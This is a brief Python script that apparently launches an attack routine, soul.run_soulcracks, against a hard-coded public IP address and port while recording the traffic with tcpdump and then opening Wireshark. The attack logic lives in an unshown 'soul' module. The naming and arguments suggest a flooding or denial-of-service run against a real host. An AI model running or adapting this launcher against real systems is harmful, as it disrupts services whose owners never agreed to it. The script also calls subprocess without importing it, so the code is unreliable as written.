import soul

soul.install_required_packages()

tcpdump_proc = soul.capture_packets()
soul.run_soulcracks('20.235.92.124', 14246, 10, 1)

if tcpdump_proc:
    print("Stopping packet capture...")
    try:
        subprocess.run(['sudo', 'kill', str(tcpdump_proc.pid)])
    except Exception as e:
        print(f"Error stopping packet capture: {e}")
    tcpdump_proc.wait()

soul.open_with_wireshark()
